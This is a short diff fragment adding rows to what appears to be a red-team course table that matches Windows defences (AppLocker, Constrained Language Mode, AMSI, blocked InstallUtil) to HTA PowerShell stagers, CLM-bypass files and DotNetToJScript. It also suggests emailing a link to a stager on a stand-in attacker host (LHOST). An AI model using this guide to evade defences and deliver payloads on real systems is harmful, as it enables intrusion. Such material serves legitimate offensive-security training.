+| No CLM — IEX pull stage two | `m02-hta-powershell-stager.hta` + `shell.ps1` |
+| AppLocker + CLM + AMSI all on | `m02-hta-embedded-clm-bypass.hta`, or pre-built `m02-clm-bypass-runspace.cs` + `InstallUtil /U` |
+| InstallUtil itself denied | `m02-clm-bypass-dotnettojscript.cs` → DotNetToJScript (module 03) |
+| Merged download+exec fails | `m02-hta-download-exec-split.hta` |
+| Mail delivery | Link to `http://LHOST/stager.hta` (attachments are often filtered) |
